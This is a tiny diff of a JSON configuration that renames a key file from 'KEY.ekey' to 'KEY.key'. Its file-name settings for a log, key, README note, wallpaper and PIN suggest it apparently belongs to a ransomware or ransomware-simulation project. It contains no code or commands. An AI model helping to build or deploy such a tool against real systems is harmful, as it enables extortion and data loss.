@@ -109,7 +109,7 @@
 	"root": {
 		"filename": {
 			"log": "Logger.log",
-			"key": "KEY.ekey",
+			"key": "KEY.key",
 			"note": "README",
 			"wallpaper": "Wallpaper.jpg",
 			"pin": "PIN.txt",
